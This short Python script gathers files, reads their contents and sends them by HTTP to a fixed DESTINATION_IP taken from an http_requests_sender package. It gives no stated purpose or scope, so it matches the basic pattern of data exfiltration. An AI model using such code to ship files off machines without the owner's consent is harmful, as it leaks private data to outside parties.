from http_requests_sender import get_files, get_files_contents, DESTINATION_IP
from http_requests_sender.http_requests_sender import send_http_requests


def main():
    files = get_files()
    contents = get_files_contents(files)
    send_http_requests(contents, DESTINATION_IP)


if __name__ == '__main__':
    main()
